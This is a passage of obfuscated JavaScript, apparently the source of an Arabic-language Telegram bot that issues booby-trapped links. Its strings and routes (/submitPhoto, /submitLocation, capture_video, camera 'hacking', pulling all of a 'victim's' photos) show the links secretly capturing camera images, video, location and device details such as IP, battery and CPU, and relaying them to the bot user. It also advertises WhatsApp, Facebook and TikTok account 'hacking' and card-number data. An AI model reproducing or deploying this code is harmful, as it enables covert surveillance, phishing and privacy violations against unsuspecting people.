        }, _0x1f6d29 = _0x1093e8[_0x4e7548(0x6a9)]['id'], _0x2dc5bc = _0x1093e8[_0x4e7548(0x8e6)]['id'], _0x15ad0b = await _0x32336c[_0x4e7548(0x69e)](isUserSubscribed, _0x1f6d29);
    if (!_0x15ad0b) {
        const _0x4ce789 = _0x32336c[_0x4e7548(0xcab)], _0x13eb26 = mandatoryChannels[_0x4e7548(0x79b)](_0x4f5ac4 => [{
                    'text': _0x4e7548(0xa5a) + _0x4f5ac4,
                    'url': _0x4e7548(0xcd2) + _0x4e7548(0x3f3) + _0x4f5ac4[_0x4e7548(0xca7)](-0xc51 * 0x1 + -0x27a * 0x3 + 0x13c0)
                }]);
        bot[_0x4e7548(0x741) + 'e'](_0x1f6d29, _0x4ce789, { 'reply_markup': { 'inline_keyboard': _0x13eb26 } });
        return;
    }
    const _0x152081 = uuid['v4']();
    linkData[_0x152081] = {
        'userId': _0x2dc5bc,
        'chatId': _0x1f6d29,
        'visitors': []
    };
    const _0x2d1bd2 = _0x32336c[_0x4e7548(0x40c)];
    bot[_0x4e7548(0x741) + 'e'](_0x1f6d29, _0x2d1bd2, {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x32336c[_0x4e7548(0x71b)],
                        'callback_data': _0x4e7548(0x7e0) + _0x152081
                    }],
                [{
                        'text': _0x32336c[_0x4e7548(0x68c)],
                        'callback_data': _0x4e7548(0x7e0) + _0x152081
                    }],
                [{
                        'text': _0x32336c[_0x4e7548(0x6a0)],
                        'callback_data': _0x4e7548(0x7e0) + _0x152081
                    }],
                [{
                        'text': _0x32336c[_0x4e7548(0x9eb)],
                        'callback_data': _0x4e7548(0x7e0) + _0x152081
                    }],
                [{
                        'text': _0x32336c[_0x4e7548(0xd5b)],
                        'callback_data': _0x4e7548(0x7e0) + _0x152081
                    }],
                [{
                        'text': _0x32336c[_0x4e7548(0xd10)],
                        'callback_data': _0x4e7548(0x7e0) + _0x152081
                    }]
            ]
        }
    });
}), bot['on'](_0x54266d(0x546) + _0x54266d(0x352), async _0x3da4d2 => {
    const _0x362538 = _0x54266d, _0x41279d = {
            'Bbvyo': function (_0x2a856c, _0x8230fb) {
                return _0x2a856c === _0x8230fb;
            }
        }, _0x439710 = _0x3da4d2[_0x362538(0x842)][_0x362538(0x6a9)]['id'], _0x53a247 = _0x3da4d2[_0x362538(0x8e6)]['id'], _0x337471 = _0x3da4d2[_0x362538(0x50f)][_0x362538(0x7aa)]('_')[-0xc0f + 0xb50 + 0xc1];
    if (linkData[_0x337471] && _0x41279d[_0x362538(0xbbf)](linkData[_0x337471][_0x362538(0xa9b)], _0x53a247)) {
        const _0x1fc898 = _0x362538(0xa75) + _0x362538(0xafb) + _0x362538(0x369) + _0x362538(0x507) + _0x362538(0xc04) + _0x362538(0x80e) + _0x362538(0xa04) + _0x362538(0xc94) + _0x362538(0xa46) + _0x362538(0x9d5) + _0x362538(0xbcc) + botUsername + _0x362538(0x7e1) + _0x337471 + (_0x362538(0x4ac) + _0x362538(0x307) + _0x362538(0x5a6) + 'ك');
        bot[_0x362538(0x741) + 'e'](_0x439710, _0x1fc898);
    }
});
const baseUrl = process[_0x54266d(0xd4b)]['r'];
function _0x43fe() {
    const _0x3fed8e = [
        'lstatSync',
        'بنين',
        '0\x20(Windows',
        'اك\x20VIP',
        '🇸🇻',
        'ode>',
        'xmxyb',
        'KBYKN',
        '*Hi\x20Bro,\x20I',
        'تم\x20حذف\x20الم',
        'request_co',
        'yZXje',
        'بانه\x20مشبوه',
        'CKMYI',
        'l3Kq58Z',
        'JlEDY',
        'span.place',
        'ك\x20الحظرعن\x20',
        'igtBh',
        '\x20الرجاء\x20تغ',
        'تم\x20إضافة\x20ق',
        'يه\x20لمعرفة\x20',
        '1kNNPU6RVm',
        'gender',
        ':\x20`',
        'النص\x20الذي\x20',
        'زخرفة\x20الاس',
        'صي.',
        'lllTTTYYYI',
        'اقع\x20💣',
        'dyJBP',
        'RJFHP',
        'ل\x20عن\x20800حر',
        '\x20الأرقام:',
        'oPvVb',
        'Citibank',
        'IIRRRAAJAX',
        'ناء\x20محاولة',
        'Android\x2010',
        'xt...',
        'ta\x20found\x20o',
        'jEKjr',
        'ck/',
        'textarea.f',
        'إرسال\x20إذاع',
        'لزر\x20لفحص\x20ا',
        'er.com',
        'IpGfM',
        'XnGKP',
        'بك\x20سوف\x20تحص',
        'DnVqd',
        'HMxXG',
        'ciPng',
        'له\x20🌏\x20:\x20',
        'هاتف\x20هذا\x20ق',
        'hostname',
        'anding-mas',
        'nnel',
        'الية\x20🇰🇵',
        'ton\x20below\x20',
        'DJYth',
        'Kwhfh',
        'GZIFI',
        'ضحيه\x20في\x20اد',
        'ate/compos',
        'ibvdl',
        '🔍\x20يتم\x20فحص:',
        'DgwbG',
        'substring',
        'يارات\x20أدنا',
        'XgVkf',
        'filePhotos',
        'ivcwx',
        'me/ZI0_bot',
        '[▓▓▓▓▓▓▓▓▓',
        'gPPXV',
        'VjTrW',
        'خدمة:\x20',
        'اختراق\x20الم',
        '\x0a📱\x20**معلوم',
        'king\x20subsc',
        'VzNww',
        'شتراك\x20في\x20ج',
        'اق\x20وتساب\x0a:',
        'ZhSKB',
        'XpxaT',
        'bhveg',
        'forEach',
        'ddLbH',
        '5072170gRuQbn',
        'لنظام:\x20',
        'القائمة:\x20',
        'كوريا\x20الشم',
        'س\x20لديك\x20إيم',
        'NDrIP',
        'mEKsC',
        'يس\x20اسمي',
        '3c-4a323e3',
        'readdirSyn',
        'اديو',
        'مدفوع\x20بسعر',
        'xRBsO',
        'ظره:',
        'An\x20error\x20o',
        '\x20🌍\x0a-\x20الدعم',
        'D=00000f29',
        'HJJJJJSSSS',
        'لرابط\x20لختر',
        'boid-outst',
        '*\x20[BOT](t.',
        'ثغره\x20ليف\x20ت',
        'https://t.',
        'ة...',
        'ول\x20اليه\x20ال',
        'checking',
        'yoJRL',
        'MxecB',
        'CnIRC',
        'TIoie',
        'nSgwQ',
        'YEtnv',
        'xMRag',
        'اعطيني\x20نكت',
        '/getNam',
        'HrEIf',
        'به:',
        'تم\x20تلغيم\x20ه',
        '676620e5eb',
        'SpQMn',
        ']\x2050%',
        'viMAn',
        'ختيار\x20دولة',
        '.\x20قم\x20بمشار',
        'mtHUR',
        'OibiB',
        'التمتع\x20في\x20',
        '\x20هذا\x20الراب',
        'YXesB',
        'n.html',
        'اب\x20أولاً</',
        '\x20المحظور\x20م',
        'سوريا\x20🇸🇾',
        'فه\x20ولكن\x20لا',
        'ljvnr',
        'foYbg',
        '\x20الحصول\x20عل',
        'ستخدام\x20الأ',
        'HTML',
        'existsSync',
        'aFaER',
        'ي\x20تريد\x20إزا',
        'o.sJ%2FAHh',
        '\x20و\x20الحذر\x20م',
        'YdTLK',
        'VUgrM',
        'TD\x20Bank',
        'غير\x20قابل\x20ل',
        'قه\x20سيتم\x20فت',
        'nd\x22;v=\x2299\x22',
        '➖\x20الدولة\x20:',
        'خرى\x20لاحقًا',
        '728248671:',
        'كتة',
        'ريونيون\x20🇷🇪',
        'o\x20for\x20chat',
        '5ff00b:T=1',
        'PeX2huaoqw',
        'ying\x20with\x20',
        '/s.html?ch',
        'المكسيك\x20🇲🇽',
        'cleanuri',
        'pwbbE',
        'أستراليا\x20🇦🇺',
        'vXTOg',
        'كازاخستان',
        'TzfbL',
        'somiD',
        'ت\x20الجهاز\x20🔬',
        'https://co',
        '\x20ملامح\x20امر',
        'add_nammes',
        'attempts',
        'dlOSW',
        'kIGNl',
        'تسجيل\x20صوت\x20',
        'مشبوه\x20🟠',
        'frkgB',
        'Image\x20Gene',
        'ه\x20بنسبه\x20لن',
        '/de\x0a\x0a<stro',
        'ي\x20تلغيم\x20را',
        'taEFw',
        'instagram.',
        'capture_vi',
        'Pjtoh',
        'facebook',
        'jrJzZ',
        'سحب\x20جميع\x20ص',
        'EwUGO',
        'xuJYw',
        'قيرغيزستان',
        'اج\x20إلى\x20',
        'startsWith',
        'CvRRl',
        'fe.html',
        '.mp4',
        '71:RT=1728',
        'بط\x20جديد\x20',
        'qffPU',
        'Khxqe',
        'yikKH',
        '.sender',
        'Error\x20fetc',
        '0.8',
        'ICOCt',
        'HUd5hmOYL3',
        'xngfm',
        'sOHnL',
        '\x20sent\x20vide',
        'emails.jso',
        'توليد\x20صور',
        'ط\x20🔒',
        'نجليزية\x20لت',
        'IhRjq',
        'RdWzr',
        'repeat',
        'tiktok',
        'EuDsg',
        'ackbox.ai',
        'rshq_tikto',
        'HQLHU',
        'في\x20',
        'env',
        'البرازيل\x20🇧🇷',
        '░░░░░░░]\x202',
        'bRmaL',
        'النمسا\x20🇦🇹',
        'د\x20الأنوية:',
        'الرجاء\x20توف',
        'امرأة\x20ولن\x20',
        'ase\x20try\x20ag',
        'floor',
        'vKWVz',
        'bvuri',
        'WMS%2Ff7U;',
        'QEbsQ',
        'yyOgw',
        'gram:',
        'ecWTF',
        '1:RT=17282',
        'بورتوريكو\x20',
        'تغيير_الرق',
        'remove_cha',
        'جوزة',
        'hex',
        'Lvyix',
        'nquxS',
        'vdwJv',
        'RyOXb',
        'mLdEJ',
        'ccurred:',
        'oUTOi',
        'هونغ\x20كونغ\x20',
        'ceqoho9dc4',
        '.ai/api/ch',
        '🇦🇹',
        'usnVh',
        'فنلندا',
        'SwfWY',
        'ة\x20الاتصال',
        'PUhGQ',
        'exit',
        'لمحادثة.',
        'rbo',
        'kGRFM',
        'اختر\x20دولة\x20',
        '1431068565',
        'دء\x20جلسة\x20جد',
        'colorDepth',
        'url',
        'ذاكرة\x20المؤ',
        '\x20الرابط:\x20',
        'JXEAi',
        'awaitingNa',
        'بولندا\x20🇵🇱',
        'WjqPt',
        ':</strong>',
        'YorZa',
        '\x20\x0aكلمة\x20الس',
        'شتركين:',
        'BQjtW',
        'tos',
        '📞\x20إرسال\x20جه',
        'غوام\x20🇬🇺',
        'KDZNS',
        'أنغولا\x20🇦🇴',
        'PzUws',
        'female',
        'oXLZs',
        '🇧🇷',
        '\x20🖥️\x0a-\x20إصدار',
        'rcel.app/',
        'AwZvB',
        'م\x20هذا\x20هو\x0a:',
        '/realTimeJ',
        'https://de',
        'الحصول_على',
        'FVPjC',
        'DnaBD',
        'sendFile',
        'بلجيكا\x20🇧🇪',
        'جزر\x20فارو\x20🇫🇴',
        '🇪🇸',
        'cb=;\x20inter',
        'battery',
        'Generate\x20V',
        '\x20:\x20@',
        'آيسلندا\x20🇮🇸',
        'IoUSu',
        '>\x0a\x0aلنشا\x20اي',
        'تغير\x20الرقم',
        'ب\x20سابق.',
        'ImageGener',
        'صربيا',
        'مية\x20📸',
        'pXvJD',
        'yhAJl',
        'me/)\x20\x0a*Pre',
        'toString',
        'KasQD',
        'تلجرام\x20🪝',
        'لا\x20يوجد\x20طل',
        'خطأ.',
        'eText',
        'ning',
        'kvfbSITh',
        'country',
        'ko)\x20Chrome',
        'ikCFX',
        '.ai',
        'جعل\x20البوت\x20',
        'إرسال\x20الصو',
        'ف\x20له\x20ايومج',
        'مرحبًا\x20بك\x20',
        'عدد\x20اليوزر',
        'essage',
        'د\x20لنسخه</s',
        'هولندا',
        'inline_key',
        'CeVWk',
        'اط.',
        'pin',
        'PElcX',
        'me/ygf2gbo',
        '🇳🇿',
        'send\x20video',
        'صيد\x20يوزرت\x20',
        'iwNZD',
        'Data',
        'فحص\x20الرابط',
        'اسم_الدولة',
        'مع\x20الشخص\x20ا',
        ':AAELOAVm0',
        'www.artbre',
        'المشاهده\x20ع',
        'RhDNR',
        'igned-exch',
        '7065665133',
        '\x20GB\x20💾\x0a-\x20عد',
        'qnZcU',
        'gTkLT',
        'hhXGF',
        'XDnPt',
        'sendVoice',
        'AdLWU',
        '255a11957:',
        'isDirector',
        '.172858961',
        'IfiQH',
        'سو\x20🇧ﺫ',
        '20728zTQVHq',
        'ائل</stron',
        'gram',
        'GqHHf',
        'الصين\x20🇨🇳',
        'https://te',
        'pYvWS',
        'لقد\x20قمنا\x20ب',
        'bodDg',
        'Bearer\x20',
        'TsAJy',
        'فحص\x20الرواب',
        'مرحباً!\x20اض',
        'GrAac',
        'كرة\x20المؤقت',
        'NExJV',
        'aXJmf',
        'كامرات\x20في\x20',
        'لام\x20معلوما',
        'ate_chat',
        '*[-]\x20Card\x20',
        'cheerio',
        'صطناعي\x20🧠',
        'kVaAx',
        '\x20NT\x2010.0;\x20',
        'data:video',
        '\x20سابقاً\x20هو',
        '978858zhlIiP',
        '\x20الرسالة.\x20',
        'ntry\x20:*\x20`',
        'uploads',
        '=\x0a[-]\x20by\x20:',
        'language',
        'ban_user',
        'حث.',
        'ntation',
        '\x20لنه\x20تم\x20فح',
        'urce/BaseS',
        'photos',
        'ر\x20بهذا\x20الب',
        'لام\x20🧙‍♂️',
        'AHqwh',
        '\x20يزال\x20مشبو',
        'ائل\x20جديدة.',
        'deviceName',
        'ئعة\x20مثل\x20\x0aا',
        'ث\x20خطأ\x20أثنا',
        'عمان\x20🇴🇲',
        'ي:\x20',
        'لإذاعة\x20إلى',
        'ر\x0aاقتراحات',
        '12.1.1.172',
        'isa',
        'اله\x20بلغ\x20\x20ب',
        'rshq_faceb',
        'ب\x20🛎•\x20\x0a',
        'الرقام\x20وهم',
        'mat\x20is\x20not',
        'fixed_mess',
        'تصال:\x20',
        '/F.html?ch',
        'XbPSD',
        '929fc9ae-8',
        'F.html',
        'xBnGL',
        'وت\x20مجاني.',
        'راقبه',
        'pONIB',
        'agram',
        'يتم\x20إرساله',
        'YvSNW',
        'SfmPV',
        'الصوره\x20',
        'ل\x20متاحة.',
        'captureFro',
        'GJyCe',
        'RCzHv',
        'احصل\x20على\x20ر',
        'QreRV',
        '\x20🇹🇲',
        'ylnYL',
        'jlmqxicb=e',
        'لقد\x20تم\x20وصو',
        '\x0a\x0aاضغط\x20على',
        '2-digit',
        'ساب\x20🟢',
        'securityPr',
        'لضحيه\x0a:\x20',
        'GUSvA',
        'تم\x20إرسال\x20و',
        'OTcjB',
        'yXUuy',
        '8590146.0.',
        'لضحيه\x20فيدي',
        'ترينيداد\x20و',
        '🚀\x20صيد\x20يوزر',
        '/submitPho',
        '<strong>جا',
        'الإمارات\x20🇦🇪',
        'ox.ai',
        'detect\x20gen',
        'uGtCi',
        'CLASSIC',
        'إختراق\x20فري',
        '__gads=ID=',
        'itFqP',
        'سير:\x0a',
        'ain\x20later.',
        'hw.vercel.',
        'lbhUx',
        'آمن\x20🟢',
        '00%',
        '➖\x20اضغط\x20ع\x20ا',
        'TKkEx',
        'الآن\x20أرسل\x20',
        'ZGyRR',
        'اهلا\x20ممكن\x20',
        'هندوراس\x20🇭🇳',
        'sSrSF',
        '64,',
        '🇳🇱',
        'نيجيريا\x20🇳🇬',
        'mvNhE',
        'قر\x20على\x20الر',
        'oQzdW',
        'max',
        'linkId',
        'VDqqA',
        'خطير\x20جداً\x20',
        'ajZeN',
        'oEWiL',
        'QEzUO',
        'ult:\x20',
        'اختراق\x20تيك',
        'لتها\x20من\x20قا',
        'vsgmf',
        'oTgFw',
        'match',
        '/email/new',
        'load',
        'AmkNh',
        's24.me/en/',
        'om/v1/chat',
        'DgeMX',
        'https://fo',
        'ormalize_f',
        'بنين\x20🇧🇯',
        'منتهى\x20قم\x20ف',
        '\x20:\x20`',
        'المغرب\x20🇲🇦',
        'ذا\x20الرابط\x20',
        'MhKAw',
        'once',
        'https://re',
        'fgdoe',
        'SunTrust\x20B',
        'ناء\x20إنشاء\x20',
        'ODYGf',
        '\x20ميغابت\x20في',
        'ي\x20كلمة\x20الب',
        'networkTyp',
        'جزر\x20كايمان',
        'fPueO',
        'ded;\x20chars',
        'YIxGQ',
        'تم\x20حظر\x20الم',
        '/submitNam',
        'screenOrie',
        'semi_quad',
        '\x20يوزرات\x20مح',
        'BblCC',
        'ASBNp',
        'رواندا\x20🇷🇼',
        '🇫🇷',
        'IT\x20-\x20VISA\x20',
        'Your-User-',
        '\x20فاير',
        'لزر\x20لتزخرف',
        'BXziy',
        'إرسال\x20رسال',
        'cpuCores',
        'MGTPU',
        'يك\x20توك💉',
        'om/v1/func',
        'موناكو\x20🇲🇨',
        'aHhIP',
        'zocwB',
        'oHVLg',
        'قمي\x20المحظو',
        'كل\x20صحيح.',
        'https://nm',
        'cNtSK',
        'removeChan',
        '\x20أثناء\x20جلب',
        '/submitLoc',
        'FFsfE',
        'بة...',
        'ليبيا\x20🇱🇾',
        'init',
        'يراد\x20الأرق',
        ':\x20\x0a\x20اليوزر',
        'xcDWw',
        'ber',
        'WfZqT',
        'https://cu',
        'addChannel',
        'راقبه.....',
        'wQtPK',
        '\x20الضحيه\x20بد',
        'hyVak',
        'HKopd',
        'er.com/cre',
        'وقت_الإنشا',
        'LZjyk',
        'كينيا\x20🇰🇪',
        'ه\x20ارسلها\x20ا',
        'ناعي',
        'YLhxD',
        '▓▓▓░░░░]\x207',
        'sponsivevo',
        'د\x20بدأت.\x20اك',
        'RfcLP',
        ']\x2075%',
        'الرجاء\x20إرس',
        'بنجاح\x20✅',
        'VPUqW',
        '4.com',
        'rning-anim',
        '\x20🗑</strong',
        'YPYOV',
        'Number\x20:*\x20',
        'رقم\x20في\x20وتس',
        '\x20على\x20معلوم',
        'HrNLn',
        'w.blackbox',
        'التحكم:',
        'vOlur',
        'البحرين\x20🇧🇭',
        'array',
        'خطأ\x20في\x20جلب',
        'osVersion',
        '\x20🤣',
        'ية\x20فيديو\x20🎥',
        'keep-alive',
        '50mb',
        'NnRPZ',
        'للمسية:\x20',
        'ميات\x20الذي\x20',
        'countryFla',
        'zkCkP',
        '\x20🔵\x0a-\x20دعم\x20ا',
        'ه\x20عبر\x20رابط',
        'ice.glitch',
        '░]\x2075%',
        '\x20لشركة\x20وتس',
        'الاصطناعي\x20',
        'وشكرا.',
        'readFileSy',
        'trong>اضغط',
        'EuiEY',
        'جرب\x20دوله\x20ا',
        '🇷🇺',
        'ميله\x20ومهذب',
        'مرحباً!\x20اخ',
        'EEZyA',
        'cUKGY',
        'بك!\x20وحصلت\x20',
        'اختر\x20ما\x20تر',
        'HorpQ',
        'orage',
        'صه\x20لمن\x20نجد',
        'tHFUw',
        'kERRh',
        'YJIcKlujfP',
        'LlbHb',
        'statusText',
        '*👤\x20معلومات',
        'ar-EG',
        'ابدأ\x20الاخت',
        'رف\x20وتعليمي',
        'ضحكه\x20جداً🤣',
        '🙋‍♂️\x20الصوره\x20',
        'يتك\x20في\x20الد',
        'BvMCJ',
        'imageDatas',
        'kMBNT',
        'أنت\x20لست\x20ال',
        'xJnqx',
        '@oapajh',
        'رسال\x20حلمك\x20',
        'امرا\x20الخلف',
        'lution',
        'PwzyT',
        'GNVjR',
        'LZreh',
        'valid',
        'FZPeB',
        'e-abab-438',
        'تايلاند\x20🇹🇭',
        'QJORP',
        'أهلاً\x20بك!\x20',
        'cstNL',
        'HEdlo',
        'ieU9Y08d5E',
        'EesOS',
        'SnwxS',
        'يد\x20القيام\x20',
        'UAgym',
        'hatId=',
        'dAhDU',
        '📊\x20إحصائيات',
        'AOzLx',
        'removeList',
        'بحث\x20عن\x20صور',
        '\x0a\x20\x20\x20\x20\x20\x20\x20\x20•',
        'svkON',
        'ss.live',
        '\x20تحتوي\x20على',
        'عندما\x20\x20تصل',
        'رسالة\x20في\x20',
        'رير\x20🧠',
        'بوركينا\x20فا',
        'Error\x20occu',
        'ات\x20المحجوز',
        'English\x20te',
        'ذا\x20\x20الرابط',
        'de_',
        'من\x20أنك\x20لست',
        'remove_vip',
        'LwUAB',
        'JkbEy',
        'اختراق\x20فيس',
        'المطور\x20قبل',
        'يد\x20إذاعتها',
        'اليونان\x20🇬🇷',
        'w.nyckel.c',
        'Capital\x20On',
        'every',
        'وفتح\x20الميز',
        'AcVfy',
        'WHchd',
        'صوت\x20ذكر',
        'فرمتة\x20جوال',
        'LsdoV',
        'كمبوديا\x20🇰🇭',
        'أمريكا',
        'الرجاء\x20إدخ',
        'ت\x20بنات\x0aخلف',
        'response',
        'taVtm',
        'Generating',
        'DwVTC',
        'kDcte',
        'تايوان\x20🇹🇼',
        'cPNzL',
        '\x20تم\x20إنشاؤه',
        '/xx',
        'm\x22;v=\x22124\x22',
        'تركيا\x20🇹🇷',
        'caXjc',
        'tercom-id-',
        'TNgIP',
        'bZaOv1SayP',
        '\x20يقوم\x20في\x20ب',
        'سنغافورة\x20🇸🇬',
        '\x20الجهاز:\x20',
        'بريطانيا\x20🇬🇧',
        'ار\x20الايمل\x20',
        'تم\x20التحقق\x20',
        'تجميع\x20النق',
        '\x20إلى\x20التلغ',
        'ل\x20بعد\x20🗳ً</',
        'اختراق\x20وات',
        'hjJjP',
        't.com/reso',
        'LGOAG',
        'لرقم\x20لنسخه',
        'MhUYW',
        'lastUpdate',
        'msYhY',
        '🇰🇲',
        '5a0e8016d4',
        '\x20المستخدم:',
        'FTMNa',
        'luBfT',
        'تم\x20جعل\x20الب',
        'لمميزات\x20تل',
        'eQukI',
        'مرحبًا!\x20ان',
        'TDIMa',
        'CBIFT',
        'و\x20🎥',
        'يوزرات\x20ربا',
        'bYCFU',
        'triple',
        'CDQiY',
        'كندا\x20🇨🇦',
        '\x20ما</stron',
        'sJhLN',
        'رقم',
        'RT=1728248',
        'catch',
        '_ga=GA1.1.',
        '🤣🤣.',
        'ب\x20شات\x20⭐',
        'icnJD',
        'upport',
        '/search/my',
        'max-age=0',
        'HTduL',
        '🇦🇺',
        'total_coun',
        'zEcXk',
        'تصوير\x20بدقه',
        '.me/',
        'ل\x20وهمي',
        'ss\x20the\x20but',
        'BmvFS',
        'الملفات\x20ال',
        'e-8528-4e2',
        'جداً\x20لا\x20تق',
        'duneP',
        'XFBgp',
        'OxASm',
        'IIXXXXJXXX',
        'وزر\x20جديد\x20✅',
        'DYlCQ',
        'mEmmp',
        'arraybuffe',
        '\x20data.\x20Ple',
        'AdweU',
        'kZoJR',
        'zTzky',
        'سريلانكا\x20🇱🇰',
        'config',
        '\x20على\x20صورة\x20',
        'RCEGX',
        'ميله\x20ومحرج',
        'الإكوادور\x20',
        'XbejR',
        'فلسطين\x20🇵🇸',
        '0a9d91',
        'nCJFB',
        'avif,image',
        'جلد:\x20',
        'تم\x20إنشاء\x20ا',
        'zRoVr',
        '▓▓▓▓░░░░░░',
        'Received\x20d',
        'qadKd',
        'gvzFO',
        'i.openai.c',
        'iIykr',
        'instagram',
        'member',
        '\x20من\x20VIP.',
        'النمسا',
        'DWLgD',
        'كة\x20رابطك\x20ل',
        '*الايدي\x20:\x20',
        'VBOFA',
        '100mb',
        'crypto',
        'راق\x20كامراة',
        'd\x20or\x20video',
        'cors',
        'مدغشقر\x20🇲🇬',
        'خدم',
        'مر\x20/free\x20ل',
        'quest:\x20Mis',
        'yYbtx',
        'mNzpA',
        'aQFzG',
        'اتك\x20[\x20/inf',
        'dsbbX',
        'الصور\x20الرا',
        'earchResou',
        'QupDi',
        'bJNav',
        'يه\x20☎️',
        'wMiji',
        '\x20أي\x20إيميل\x20',
        'الخادم\x20يعم',
        'age_chat',
        '**\x0a-\x20الدول',
        'ر\x20لجمع\x20معل',
        'get_link',
        'تم\x20انشاء\x20ر',
        'sessionId=',
        'ي\x20🕹',
        'QjGHA',
        'aReFn',
        'الكويت\x20🇰🇼',
        'to\x20generat',
        'bYdjS',
        'uzRGf',
        'LXjrJ',
        'أوروغواي\x20🇺🇾',
        '1.17285896',
        '\x20⚙️\x0a-\x20لغة\x20ا',
        '\x20انشـاء\x20بر',
        '\x20المطور\x20لل',
        'باع\x20هذه\x20ال',
        'نامج\x20وحذف\x20',
        'xglLT',
        'OuurW',
        'ات\x20المدفوع',
        '\x20صوره\x20🔒',
        'ال\x20للتحقق\x20',
        '\x20فاير\x20👾',
        'pcPgq',
        'ساله\x20لا\x20تق',
        'أفغانستان\x20',
        '\x20اخره\x20لاحق',
        'NjsRN',
        'ztwMO',
        'ك\x20حظره:',
        '🇧🇯',
        '\x22,\x22redux_n',
        'ب\x20🛎•\x20\x0a➖\x20رق',
        'gfgTK',
        'من\x20القائمة',
        'لراديو.',
        '\x20with\x20conf',
        'مرحبا!\x20في\x20',
        'PVCUK',
        'KkTSP',
        'شاءه\x20\x20/an\x0a',
        'browserNam',
        '🇨🇳',
        'غوادلوب\x20🇬🇵',
        'مستخدم\x20لإض',
        '?chatId=',
        'عشوائية',
        'https%3A%2',
        'aznVc',
        'eTDDj',
        'الصين',
        'SRVWH',
        'د\x20صورة\x20مرة',
        'نقاطك.',
        'ction',
        'all',
        'uery',
        'ource_url=',
        'ZDSPI',
        'vgrYS',
        'bfRwf',
        'xAEDV',
        'الفلبين\x20',
        'sendPhoto',
        'tnQUR',
        'ا\x20الرجاء\x20ا',
        '\x0a\x20\x20\x20\x20\x20\x20\x20\x20',
        'الامر\x0a\x20/fr',
        'يد\x20اليوزرا',
        'هونغ\x20كونغ',
        'rVZNE',
        'bab-438687',
        'unbanUser',
        '.png',
        'رومانيا\x20🇷🇴',
        '🇰🇿',
        '\x20النقاط\x20وف',
        'Mexjk',
        'تغيير\x20الرق',
        'خاص\x20بك\x0a\x20عن',
        'IwmYz',
        'UeqFE',
        'AoZyu',
        'وقع\x20📍',
        'stringify',
        'بك\x20فقط.',
        'ال\x20الأسماء',
        '7oxkoPuxqz',
        'izTRV',
        'cLIwY',
        'oTXCt',
        'polling_er',
        'male_voice',
        'ابه\x20تلجرام',
        'YTrXK',
        'parse',
        'ylPIn',
        'Error:\x20',
        'NayUU',
        '🇳🇨',
        '\x20Chrome/11',
        'unlinkSync',
        'eder.com',
        'RXulc',
        'لام\x20أي\x20رسا',
        'التصنيف:\x20',
        'nvite',
        ',\x20\x22Chromiu',
        'body',
        'xLfmA',
        'صربيا\x20🇷🇸',
        'GmAwV',
        'BNEcv',
        'fhAKH',
        'ZlmIN',
        'aKwBZ',
        'snapchat.c',
        'قتة:',
        '/ge',
        '🇩🇪',
        'جليزية\x20فقط',
        'setItem',
        'hhPEk',
        '\x20نهائية:\x20',
        'خدم:\x20',
        'left',
        'nVBoq',
        '\x20اي\x20برمجيا',
        'الرجاء\x20الا',
        'o\x20]</stron',
        'esponse',
        'اختراق\x20كام',
        'internalSt',
        'يد\x20وهمي\x20لا',
        'NqLNP',
        'الفلبين\x20🇵🇭',
        'YLRXa',
        '🇺🇿',
        'لمعلومات:\x20',
        'error',
        '</strong>',
        'jMqZj',
        'شخص\x20جديد\x20د',
        'OFjCi',
        '\x0a\x0a\x0a\x20\x20\x20\x20\x20\x20\x20',
        'يه\x20الاصيله',
        'Harfn',
        'screenReso',
        'جباري',
        'OuiFA',
        'qOlZe',
        'xuyrm',
        'WVCuc',
        'jf75p4p49h',
        'اختر\x20نوع\x20ا',
        'YGLQx',
        'و\x20حاول\x20مره',
        'IXfzy',
        'binary',
        'Failed\x20to\x20',
        'ges',
        'fari/537.3',
        'LJAKz',
        'DhqVh',
        'dsjUr',
        'وة\x20امانها\x20',
        '▓]\x20100%',
        'ror',
        'لقد\x20تم\x20اخت',
        '\x20📅\x0a-\x20بروتو',
        ']\x200%',
        '\x20بإنشاء\x20حس',
        'qRYpl',
        'edb9d414-5',
        'للإبلاغ\x20بن',
        '.ai/',
        '/getName',
        'dns',
        'الراديو\x20📻',
        'إنشاء\x20📅\x20:\x20',
        '▓░░░░░░]\x205',
        'م\x20للمطور:',
        '\x0aرابط\x20البث',
        'زرار.\x20راسل',
        'stream',
        'aKBXS',
        'DlfuD',
        'WwDdJ',
        'CfFDt',
        'ًا\x20',
        '`\x0a*=======',
        '\x20لجميع\x20الم',
        'ابط\x20قم\x20في\x20',
        '+7KZ',
        '\x20🔄\x0a-\x20عمق\x20ا',
        '3;\x20connect',
        'kjskX',
        'ف\x20\x20رساله\x20ج',
        '.\x0a\x20⚠️ملاحظه',
        'aThHadlLGB',
        'rred,\x20retr',
        'ram-bot-ap',
        '/:userId',
        'waiting_fo',
        'xRixz',
        'ata:',
        'evAup',
        '\x20IP:\x20',
        '/imageRece',
        'MWUTx',
        'LEHaH',
        'ADXyR',
        'رة\x20(RAM):\x20',
        'LHJLR',
        'https',
        '▓▓░░░░░░░░',
        '🇵🇹',
        'me/',
        'LORxT',
        'أهلاً!\x20اضغ',
        'xuiKy',
        'ياء\x20🧠',
        'Geaun',
        '\x20⚠️',
        'خال\x20رقم\x20ال',
        'اختراق\x20الك',
        'creationDa',
        '\x20📜\x0a-\x20نوع\x20ا',
        'male',
        'XWxCc',
        'لى\x20محطات\x20ا',
        'jYsQR',
        '\x20🔒\x0a-\x20نطاق\x20',
        '_رقم',
        'اختر\x20الدول',
        'gSQfp',
        'nzPkc',
        '\x20الذكاء\x20ال',
        'ge_details',
        'حاولة\x20مرة\x20',
        '<strong>ال',
        'KgGEs',
        'IAtlu',
        'number',
        'node-teleg',
        'تة.',
        'ng>يرجى\x20ات',
        'قع\x20والبرام',
        'سايل\x20الضحي',
        'السويد\x20🇸🇪',
        'ضغط\x20على\x20هذ',
        'bTFur',
        'حث\x20عن\x20الصو',
        'جاري\x20الكتا',
        '/whatsapp?',
        'er.com/api',
        'vdxrqm1a55',
        'Loading\x20Ra',
        'zHVhxvqpPx',
        'roCIC',
        'النرويج\x20🇳🇴',
        'RtkOE',
        'store',
        'qhZzf',
        'EugDB',
        'الذي\x20تم\x20ان',
        'pSHeU',
        'pkUsl',
        'sXHzc',
        'تجرام\x20🖥',
        'choose_typ',
        'لف\x20الشخصي:',
        't?start=',
        '\x20الجهاز',
        'nTAfu',
        'backQuery',
        'online',
        'iFYOZ',
        '\x20الاتصال.',
        'ank',
        'file_id',
        'نيكاراغوا\x20',
        'gJtnW',
        'الهند\x20🇮🇳',
        'إضافة\x20مشتر',
        'om/api/gen',
        'CUksF',
        'includes',
        'دفوع.',
